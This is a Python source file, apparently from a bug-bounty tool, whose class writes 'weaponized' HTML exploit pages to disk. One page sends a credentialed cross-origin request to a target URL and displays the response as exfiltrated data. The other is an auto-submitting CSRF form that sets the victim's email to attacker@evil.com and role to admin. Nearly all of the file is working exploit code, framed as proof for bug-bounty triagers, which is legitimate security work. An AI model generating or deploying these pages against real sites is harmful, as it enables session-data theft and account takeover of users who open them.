import os
from datetime import datetime
from rich.console import Console

console = Console()

class ArtifactBuilder:
    """
    v26.0 The Verdict: Weaponized Exploit Artifact Builder.
    Generates functional HTML exploit files for vulnerabilities that require
    user interaction (CSRF, CORS bypasses, WebSockets, etc.), providing
    irrefutable proof for bug bounty triagers.
    """
    
    def __init__(self):
        _pkg_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
        self.evidence_dir = os.path.join(_pkg_root, "reports", "evidence", "artifacts")
        
        if not os.path.exists(self.evidence_dir):
            os.makedirs(self.evidence_dir)

    def _generate_cors_payload(self, target_url: str) -> str:
        """Generates an HTML file that exploits an insecure CORS configuration using XHR."""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit Evidence</title>
</head>
<body>
    <h2>CORS Data Exfiltration Proof</h2>
    <p>Target: <b>{target_url}</b></p>
    <p>Status: <span id="status" style="color:orange;">Executing XHR request...</span></p>
    <textarea id="output" style="width:100%; height:300px;" placeholder="Exfiltrated data will appear here..."></textarea>

    <script>
        var req = new XMLHttpRequest();
        req.onload = function() {{
            document.getElementById('status').innerText = "VULNERABLE! Data stolen successfully.";
            document.getElementById('status').style.color = "red";
            document.getElementById('output').value = this.responseText;
        }};
        req.onerror = function() {{
            document.getElementById('status').innerText = "Failed. Target might have patched the issue.";
            document.getElementById('status').style.color = "green";
        }};
        req.open('GET', '{target_url}', true);
        req.withCredentials = true; // Send existing session cookies
        req.send();
    </script>
</body>
</html>
"""
        return html

    def _generate_csrf_payload(self, target_url: str) -> str:
        """Generates an auto-submitting HTML form for CSRF proof."""
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit Evidence</title>
</head>
<body>
    <h2>CSRF Auto-Submission Proof</h2>
    <p>If you see a successful state change on the target site, the CSRF is confirmed.</p>
    <p>Target: <b>{target_url}</b></p>
    
    <!-- Adjust method and inputs based on the actual vulnerable endpoint -->
    <form action="{target_url}" method="POST" id="csrf-form">
        <input type="hidden" name="email" value="attacker@evil.com" />
        <input type="hidden" name="role" value="admin" />
        <input type="submit" value="Submit Request" />
    </form>
    
    <script>
        // Auto-submit the malicious form immediately upon loading
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
"""
        return html

    def build_artifact(self, finding: dict) -> str | None:
        """
        Takes a finding dictionary. If the vulnerability requires a weaponized 
        HTML file (like CORS or CSRF), it generates it and returns the file path.
        """
        vuln_type = finding.get("type", "").lower()
        target_url = finding.get("url") or finding.get("evidence_url")
        
        if not target_url:
            return None
            
        payload_html = None
        artifact_type = None

        if "cors" in vuln_type:
            payload_html = self._generate_cors_payload(target_url)
            artifact_type = "cors_exploit"
        elif "csrf" in vuln_type or "cross-site request forgery" in vuln_type:
            payload_html = self._generate_csrf_payload(target_url)
            artifact_type = "csrf_exploit"
            
        if not payload_html:
            return None
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{artifact_type}_{timestamp}.html"
        filepath = os.path.join(self.evidence_dir, filename)
        
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(payload_html)
            console.print(f"[bold green][📦 Artifact Builder] Weaponized {artifact_type} saved to {filepath}[/bold green]")
            return filepath
        except Exception as e:
            console.print(f"[bold red][Artifact Builder] Failed to write exploit artifact: {e}[/bold red]")
            return None
